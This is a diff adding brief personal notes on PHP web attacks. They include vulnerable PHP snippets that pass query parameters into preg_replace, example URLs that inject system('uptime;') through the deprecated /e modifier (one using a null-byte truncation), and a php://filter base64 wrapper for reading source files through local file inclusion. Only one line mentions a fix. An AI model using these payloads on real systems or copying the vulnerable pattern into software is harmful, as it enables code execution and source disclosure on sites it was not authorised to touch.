@@ -1,0 +1,34 @@
+To read the content of a file
+
+file_get_contents('file.php');
+#####################################################################################################
+
+http://php.net/manual/de/function.preg-replace.php
+http://php.net/manual/en/reference.pcre.pattern.modifiers.php#reference.pcre.pattern.modifiers.eval
+
+Warning
+This feature was DEPRECATED in PHP 5.5.0, and REMOVED as of PHP 7.0.0.
+
+
+http://.../known/e&witch=system('uptime;')
+<?php
+$in = 'Somewhere, something incredible is waiting to be known';
+echo preg_replace($_GET['replace'], $_GET['with'], $in);
+?>
+
+http://...known/e%00&witch=system('uptime;')
+<?php
+$in = 'Somewhere, something incredible is waiting to be known';
+echo preg_replace('/' . $_GET['replace'] . '/i', $_GET['with'], $in);
+?>
+
+Secure with preg_quote() or update interpreter-Version
+#####################################################################################################
+If LFI is possible
+php://filter/convert.base64-encode/resource=home
+
+echo -n bl4h== | base64 -d 
+
+convert to prevent that the php interpreter convert it again in a dynamic webpage
+#####################################################################################################
+
